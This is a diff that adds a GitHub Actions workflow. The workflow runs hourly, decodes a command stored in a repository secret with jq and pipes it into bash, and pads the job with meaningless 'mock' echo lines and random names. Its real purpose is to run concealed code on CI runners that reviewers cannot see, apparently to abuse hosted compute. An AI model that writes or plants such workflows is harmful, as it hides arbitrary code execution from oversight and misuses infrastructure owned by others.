@@ -1,0 +1,25 @@
+name: nanxiangchou0453
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nanxiangchou0453
+        env:
+          t6949: ${{ secrets.t6949 }}
+        run: |
+          for i in {1..3}; do echo "Iter $i"; done
+          echo $t6949 | jq -r .k31482 | /bin/bash
+          echo "BC mock: echo '2+2' | bc 2>/dev/null || echo no-bc"
+          echo "Readelf mock: readelf --version 2>/dev/null | head -1 || echo no-readelf"
+          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
+          echo "Id mock: id -un 2>/dev/null || echo no-id"
+          ls -la 2>/dev/null || true
+          echo "Signal mock: trap '' SIGINT"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          echo "Time diff mock: echo \$SECONDS"
